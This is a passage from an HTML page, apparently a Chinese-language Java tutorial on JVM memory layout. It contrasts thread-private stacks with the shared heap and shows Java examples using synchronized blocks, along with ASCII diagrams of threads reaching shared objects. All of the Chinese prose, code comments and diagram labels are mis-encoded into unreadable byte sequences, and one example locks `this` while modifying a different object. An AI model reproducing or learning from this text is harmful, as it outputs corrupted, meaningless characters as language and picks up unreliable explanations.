éœ€åŒæ­¥ï¼Œç›´æ¥è®¿é—®</td><td>éœ€è¦åŒæ­¥ï¼Œå¯èƒ½è¾ƒæ…¢</td></tr><tr><td><strong>æ•°æ®éš”ç¦»</strong></td><td>çº¿ç¨‹é—´å®Œå…¨éš”ç¦»ï¼Œäº’ä¸å½±å“</td><td>çº¿ç¨‹é—´å¯ä»¥å…±äº«æ•°æ®</td></tr></tbody></table>
<p><strong>å®é™…åº”ç”¨åœºæ™¯ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryAreaExample</span> {
    <span class="hljs-comment">// é™æ€å˜é‡ â†’ æ–¹æ³•åŒºï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">classVar</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å±€éƒ¨å˜é‡ â†’ è™šæ‹Ÿæœºæ ˆï¼ˆç§æœ‰åŒºåŸŸï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">localVar</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;
        
        <span class="hljs-comment">// å¯¹è±¡åˆ›å»º â†’ å †ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
        <span class="hljs-comment">// å¯¹è±¡å¼•ç”¨ â†’ è™šæ‹Ÿæœºæ ˆï¼ˆç§æœ‰åŒºåŸŸï¼‰</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// objå¼•ç”¨åœ¨æ ˆä¸­ï¼ŒObjectå¯¹è±¡åœ¨å †ä¸­</span>
        
        <span class="hljs-comment">// é™æ€å˜é‡è®¿é—® â†’ éœ€è¦åŒæ­¥ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
        <span class="hljs-keyword">synchronized</span> (MemoryAreaExample.class) {
            classVar++;
        }
        
        <span class="hljs-comment">// å±€éƒ¨å˜é‡è®¿é—® â†’ æ— éœ€åŒæ­¥ï¼ˆç§æœ‰åŒºåŸŸï¼‰</span>
        localVar++;
    }
}
</code></pre>
<h5 data-id="heading-15">2.3.4 æ•°æ®å¦‚ä½•åœ¨ç§æœ‰åŒºåŸŸå’Œå…±äº«åŒºåŸŸä¹‹é—´æµè½¬</h5>
<p><strong>æ•°æ®æµè½¬çš„å®Œæ•´è¿‡ç¨‹ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">æ­¥éª¤1ï¼šçº¿ç¨‹ä»å…±äº«åŒºåŸŸè¯»å–å¯¹è±¡å¼•ç”¨åˆ°ç§æœ‰åŒºåŸŸ

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å…±äº«åŒºåŸŸï¼ˆå †ï¼‰     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚  å¯¹è±¡å®ä¾‹    â”‚ â”‚
â”‚  â”‚  <span class="hljs-attr">value</span> = <span class="hljs-number">42</span>  â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚         â”‚         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
          â”‚ è¯»å–å¼•ç”¨
          â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç§æœ‰åŒºåŸŸï¼ˆæ ˆï¼‰     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚  objå¼•ç”¨     â”‚ â”‚ â† å¼•ç”¨å­˜å‚¨åœ¨æ ˆä¸­
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ­¥éª¤2ï¼šçº¿ç¨‹åœ¨ç§æœ‰åŒºåŸŸä¸­æ“ä½œå¯¹è±¡å¼•ç”¨

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç§æœ‰åŒºåŸŸï¼ˆæ ˆï¼‰     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚  objå¼•ç”¨     â”‚ â”‚ â† å¼•ç”¨åœ¨æ ˆä¸­
â”‚  â”‚  localVar    â”‚ â”‚ â† å±€éƒ¨å˜é‡ä¹Ÿåœ¨æ ˆä¸­
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ­¥éª¤3ï¼šçº¿ç¨‹é€šè¿‡å¼•ç”¨è®¿é—®å…±äº«åŒºåŸŸä¸­çš„å¯¹è±¡

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     é€šè¿‡å¼•ç”¨è®¿é—®      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç§æœ‰åŒºåŸŸï¼ˆæ ˆï¼‰     â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; â”‚  å…±äº«åŒºåŸŸï¼ˆå †ï¼‰     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚                     â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚  objå¼•ç”¨     â”‚ â”‚                     â”‚  â”‚  å¯¹è±¡å®ä¾‹    â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚                     â”‚  â”‚  <span class="hljs-attr">value</span> = <span class="hljs-number">42</span>  â”‚ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
                                           â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ­¥éª¤4ï¼šä¿®æ”¹å…±äº«åŒºåŸŸä¸­çš„å¯¹è±¡ï¼ˆéœ€è¦åŒæ­¥ï¼‰

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     ä¿®æ”¹å¯¹è±¡         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç§æœ‰åŒºåŸŸï¼ˆæ ˆï¼‰     â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; â”‚  å…±äº«åŒºåŸŸï¼ˆå †ï¼‰     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    (éœ€è¦åŒæ­¥)      â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚  objå¼•ç”¨     â”‚ â”‚                     â”‚  â”‚  å¯¹è±¡å®ä¾‹    â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚                     â”‚  â”‚  <span class="hljs-attr">value</span> = <span class="hljs-number">43</span>  â”‚ â”‚ â† è¢«ä¿®æ”¹
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
                                           â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å®é™…ç¤ºä¾‹ä»£ç ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataFlowExample</span> {
    <span class="hljs-comment">// å…±äº«å˜é‡ï¼šå­˜å‚¨åœ¨å †ä¸­ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">sharedValue</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processData</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. å±€éƒ¨å˜é‡å­˜å‚¨åœ¨ç§æœ‰åŒºåŸŸï¼ˆæ ˆï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">localVar</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;  <span class="hljs-comment">// å­˜å‚¨åœ¨æ ˆçš„å±€éƒ¨å˜é‡è¡¨</span>
        
        <span class="hljs-comment">// 2. å¯¹è±¡å­˜å‚¨åœ¨å…±äº«åŒºåŸŸï¼ˆå †ï¼‰ï¼Œå¼•ç”¨å­˜å‚¨åœ¨ç§æœ‰åŒºåŸŸï¼ˆæ ˆï¼‰</span>
        <span class="hljs-type">DataFlowExample</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataFlowExample</span>();  <span class="hljs-comment">// å¯¹è±¡åœ¨å †ä¸­ï¼Œobjå¼•ç”¨åœ¨æ ˆä¸­</span>
        
        <span class="hljs-comment">// 3. é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> obj.sharedValue;  <span class="hljs-comment">// é€šè¿‡æ ˆä¸­çš„å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</span>
        
        <span class="hljs-comment">// 4. ä¿®æ”¹å †ä¸­çš„å¯¹è±¡ï¼ˆéœ€è¦åŒæ­¥ï¼Œå› ä¸ºæ˜¯å…±äº«åŒºåŸŸï¼‰</span>
        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
            obj.sharedValue = <span class="hljs-number">100</span>;  <span class="hljs-comment">// ä¿®æ”¹å †ä¸­çš„å…±äº«å˜é‡ï¼Œéœ€è¦åŒæ­¥</span>
        }
        
        <span class="hljs-comment">// 5. å¤šä¸ªçº¿ç¨‹å¯ä»¥å…±äº«åŒä¸€ä¸ªå¯¹è±¡</span>
        <span class="hljs-comment">// å¦‚æœå¤šä¸ªçº¿ç¨‹æŒæœ‰åŒä¸€ä¸ªobjçš„å¼•ç”¨ï¼Œå®ƒä»¬éƒ½å¯ä»¥è®¿é—®å †ä¸­çš„åŒä¸€ä¸ªå¯¹è±¡</span>
    }
}
</code></pre>
<p><strong>å¤šçº¿ç¨‹ç¯å¢ƒä¸‹çš„æ•°æ®æµè½¬ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiThreadDataFlow</span> {
    <span class="hljs-comment">// å…±äº«å¯¹è±¡ï¼šå­˜å‚¨åœ¨å †ä¸­ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">SharedObject</span> <span class="hljs-variable">shared</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedObject</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// çº¿ç¨‹1</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-comment">// ä»å…±äº«åŒºåŸŸè¯»å–å¼•ç”¨ï¼ˆæ ˆä¸­çš„å¼•ç”¨æŒ‡å‘å †ä¸­çš„å¯¹è±¡ï¼‰</span>
            <span class="hljs-type">SharedObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> shared;  <span class="hljs-comment">// objå¼•ç”¨åœ¨æ ˆ1ä¸­ï¼ŒæŒ‡å‘å †ä¸­çš„sharedå¯¹è±¡</span>
            
            <span class="hljs-comment">// é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</span>
            obj.setValue(<span class="hljs-number">1</span>);  <span class="hljs-comment">// ä¿®æ”¹å †ä¸­çš„å¯¹è±¡</span>
        });
        
        <span class="hljs-comment">// çº¿ç¨‹2</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-comment">// ä»å…±äº«åŒºåŸŸè¯»å–å¼•ç”¨ï¼ˆæ ˆä¸­çš„å¼•ç”¨æŒ‡å‘å †ä¸­çš„å¯¹è±¡ï¼‰</span>
            <span class="hljs-type">SharedObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> shared;  <span class="hljs-comment">// objå¼•ç”¨åœ¨æ ˆ2ä¸­ï¼ŒæŒ‡å‘åŒä¸€ä¸ªsharedå¯¹è±¡</span>
            
            <span class="hljs-comment">// é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</span>
            obj.setValue(<span class="hljs-number">2</span>);  <span class="hljs-comment">// ä¿®æ”¹åŒä¸€ä¸ªå¯¹è±¡ï¼Œéœ€è¦åŒæ­¥</span>
        });
        
        thread1.start();
        thread2.start();
        
        <span class="hljs-comment">// ä¸¤ä¸ªçº¿ç¨‹çš„æ ˆæ˜¯ç‹¬ç«‹çš„ï¼ˆç§æœ‰åŒºåŸŸï¼‰</span>
        <span class="hljs-comment">// ä½†éƒ½é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„åŒä¸€ä¸ªå¯¹è±¡ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
        <span class="hljs-comment">// éœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</span>
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SharedObject</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(<span class="hljs-type">int</span> v)</span> {
        <span class="hljs-built_in">this</span>.value = v;
    }
}
</code></pre>
<h5 data-id="heading-16">2.3.5 ä¸ºä»€ä¹ˆéœ€è¦åŒºåˆ†ç§æœ‰åŒºåŸŸå’Œå…±äº«åŒºåŸŸ</h5>
<p><strong>è®¾è®¡åŸå› ï¼š</strong></p>
<ol>
<li>
<p><strong>æ€§èƒ½è€ƒè™‘</strong></p>
<ul>
<li><strong>ç§æœ‰åŒºåŸŸ</strong>ï¼šè®¿é—®å¿«é€Ÿï¼Œæ— éœ€åŒæ­¥æœºåˆ¶ï¼Œæé«˜æ‰§è¡Œæ•ˆç‡</li>
<li><strong>å…±äº«åŒºåŸŸ</strong>ï¼šç»Ÿä¸€ç®¡ç†ï¼Œå‡å°‘å†…å­˜å ç”¨ï¼Œæé«˜å†…å­˜åˆ©ç”¨ç‡</li>
</ul>
</li>
<li>
<p><strong>çº¿ç¨‹å®‰å…¨</strong></p>
<ul>
<li><strong>ç§æœ‰åŒºåŸŸ</strong>ï¼šå¤©ç„¶çº¿ç¨‹å®‰å…¨ï¼Œé¿å…æ•°æ®ç«äº‰ï¼Œç®€åŒ–ç¼–ç¨‹</li>
<li><strong>å…±äº«åŒºåŸŸ</strong>ï¼šéœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œä½†å…è®¸çº¿ç¨‹é—´é€šä¿¡</li>
</ul>
</li>
<li>
<p><strong>å†…å­˜ç®¡ç†</strong></p>
<ul>
<li><strong>ç§æœ‰åŒºåŸŸ</strong>ï¼šéšçº¿ç¨‹é”€æ¯è‡ªåŠ¨å›æ”¶ï¼Œç®¡ç†ç®€å•</li>
<li><strong>å…±äº«åŒºåŸŸ</strong>ï¼šéœ€è¦GCç»Ÿä¸€ç®¡ç†ï¼Œç”Ÿå‘½å‘¨æœŸé•¿</li>
</ul>
</li>
<li>
<p><strong>æ•°æ®éš”ç¦»</strong></p>
<ul>
<li><strong>ç§æœ‰åŒºåŸŸ</strong>ï¼šçº¿ç¨‹é—´æ•°æ®éš”ç¦»ï¼Œé¿å…ç›¸äº’å¹²æ‰°</li>
<li><strong>å…±äº«åŒºåŸŸ</strong>ï¼šå…è®¸çº¿ç¨‹é—´æ•°æ®å…±äº«å’Œé€šä¿¡ï¼Œå®ç°åä½œ</li>
</ul>
</li>
</ol>
<p><strong>å®é™…å¥½å¤„ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BenefitsExample</span> {
    <span class="hljs-comment">// å±€éƒ¨å˜é‡ï¼ˆç§æœ‰åŒºåŸŸï¼‰ï¼šæ— éœ€åŒæ­¥ï¼Œæ€§èƒ½å¥½</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">local</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// å­˜å‚¨åœ¨æ ˆä¸­ï¼Œçº¿ç¨‹ç§æœ‰ï¼Œæ— éœ€åŒæ­¥</span>
        local++;  <span class="hljs-comment">// å¿«é€Ÿï¼Œæ— éœ€åŠ é”</span>
    }
    
    <span class="hljs-comment">// å…±äº«å˜é‡ï¼ˆå…±äº«åŒºåŸŸï¼‰ï¼šéœ€è¦åŒæ­¥ï¼Œä½†å…è®¸çº¿ç¨‹é—´é€šä¿¡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">shared</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// å­˜å‚¨åœ¨å †ä¸­ï¼Œçº¿ç¨‹å…±äº«</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        shared++;  <span class="hljs-comment">// éœ€è¦åŒæ­¥ï¼Œä½†å…è®¸å¤šä¸ªçº¿ç¨‹åä½œ</span>
    }
}
</code></pre>
<h5 data-id="heading-17">2.3.6 å¤šçº¿ç¨‹ç¯å¢ƒä¸‹çš„å·¥ä½œæµç¨‹</h5>
<p><strong>å¤šçº¿ç¨‹è®¿é—®å…±äº«å¯¹è±¡çš„å®Œæ•´æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">åœºæ™¯ï¼šä¸‰ä¸ªçº¿ç¨‹è®¿é—®å †ä¸­çš„ä¸¤ä¸ªå…±äº«å¯¹è±¡

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          å…±äº«åŒºåŸŸï¼ˆå †ï¼‰                        â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚         Javaå †                       â”‚   â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚   â”‚
â”‚  â”‚  â”‚   å¯¹è±¡<span class="hljs-selector-tag">A</span>    â”‚  â”‚   å¯¹è±¡<span class="hljs-selector-tag">B</span>    â”‚    â”‚   â”‚
â”‚  â”‚  â”‚ value = <span class="hljs-number">1</span>  â”‚  â”‚ value = <span class="hljs-number">2</span>  â”‚    â”‚   â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜    â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
            â”‚               â”‚
            â”‚               â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”˜               â””â”€â”€â”€â”€â”€â”€â”€â”
    â”‚                               â”‚
    â†“                               â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ç§æœ‰åŒºåŸŸ â”‚                     â”‚ ç§æœ‰åŒºåŸŸ â”‚
â”‚ (æ ˆ<span class="hljs-number">1</span>)   â”‚                     â”‚ (æ ˆ<span class="hljs-number">2</span>)   â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â” â”‚                     â”‚ â”Œâ”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚objA â”‚ â”‚                     â”‚ â”‚objB â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”˜ â”‚                     â”‚ â””â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    â†‘                               â†‘
    â”‚                               â”‚
    â”‚                               â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ çº¿ç¨‹<span class="hljs-number">1</span>   â”‚                     â”‚ çº¿ç¨‹<span class="hljs-number">2</span>   â”‚
â”‚ è®¿é—®<span class="hljs-selector-tag">A</span>   â”‚                     â”‚ è®¿é—®<span class="hljs-selector-tag">B</span>   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

            â”‚
            â†“
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚  ç§æœ‰åŒºåŸŸ      â”‚
    â”‚  (æ ˆ<span class="hljs-number">3</span>)        â”‚
    â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
    â”‚  â”‚objAå¼•ç”¨ â”‚  â”‚ â† ä¹ŸæŒ‡å‘å¯¹è±¡<span class="hljs-selector-tag">A</span>
    â”‚  â”‚objBå¼•ç”¨ â”‚  â”‚ â† ä¹ŸæŒ‡å‘å¯¹è±¡<span class="hljs-selector-tag">B</span>
    â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
            â†‘
            â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”˜
    â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ çº¿ç¨‹<span class="hljs-number">3</span>   â”‚
â”‚ è®¿é—®<span class="hljs-selector-tag">A</span>å’Œ<span class="hljs-selector-tag">B</span>â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

å·¥ä½œæµç¨‹ï¼š
<span class="hljs-number">1</span>. æ¯ä¸ªçº¿ç¨‹çš„æ ˆæ˜¯ç‹¬ç«‹çš„ï¼ˆç§æœ‰åŒºåŸŸï¼‰
<span class="hljs-number">2</span>. å¤šä¸ªçº¿ç¨‹å¯ä»¥å…±äº«å †ä¸­çš„å¯¹è±¡ï¼ˆå…±äº«åŒºåŸŸï¼‰
<span class="hljs-number">3</span>. çº¿ç¨‹é€šè¿‡æ ˆä¸­çš„å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡
<span class="hljs-number">4</span>. è®¿é—®å…±äº«å¯¹è±¡éœ€è¦åŒæ­¥æœºåˆ¶ï¼ˆsynchronizedã€volatileç­‰ï¼‰
</code></pre>
<p><strong>å®é™…ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiThreadWorkflow</span> {
    <span class="hljs-comment">// å…±äº«å¯¹è±¡ï¼šå­˜å‚¨åœ¨å †ä¸­ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">SharedResource</span> <span class="hljs-variable">resource1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedResource</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">SharedResource</span> <span class="hljs-variable">resource2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedResource</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// çº¿ç¨‹1ï¼šè®¿é—®resource1</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-comment">// obj1å¼•ç”¨å­˜å‚¨åœ¨æ ˆ1ä¸­ï¼ˆç§æœ‰åŒºåŸŸï¼‰</span>
            <span class="hljs-type">SharedResource</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> resource1;  <span class="hljs-comment">// å¼•ç”¨æŒ‡å‘å †ä¸­çš„resource1</span>
            
            <span class="hljs-comment">// é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
            <span class="hljs-keyword">synchronized</span> (obj1) {
                obj1.doWork();
            }
        });
        
        <span class="hljs-comment">// çº¿ç¨‹2ï¼šè®¿é—®resource2</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-comment">// obj2å¼•ç”¨å­˜å‚¨åœ¨æ ˆ2ä¸­ï¼ˆç§æœ‰åŒºåŸŸï¼‰</span>
            <span class="hljs-type">SharedResource</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> resource2;  <span class="hljs-comment">// å¼•ç”¨æŒ‡å‘å †ä¸­çš„resource2</span>
            
            <span class="hljs-comment">// é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
            <span class="hljs-keyword">synchronized</span> (obj2) {
                obj2.doWork();
            }
        });
        
        <span class="hljs-comment">// çº¿ç¨‹3ï¼šåŒæ—¶è®¿é—®resource1å’Œresource2</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
